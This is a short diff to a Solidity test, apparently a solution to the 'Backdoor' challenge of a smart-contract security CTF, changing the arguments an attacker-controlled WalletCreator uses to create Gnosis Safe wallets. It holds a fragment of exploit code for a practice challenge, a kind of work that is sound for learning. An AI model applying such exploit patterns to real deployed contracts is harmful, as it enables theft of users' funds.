@@ -82,14 +82,13 @@ contract Backdoor is Test {
     function testExploit() public {
         /** EXPLOIT START **/
         vm.startPrank(attacker);
-        fallbackhandler = new FallBackHandler();
         walletCreator = new WalletCreator(
             address(masterCopy),
             address(walletFactory),
             walletRegistry,
             users,
-            address(fallbackhandler),
-            address(dvt)
+            address(dvt),
+            address(attacker)
         );
         walletCreator.createGnosisSafeWallet();
         vm.stopPrank();
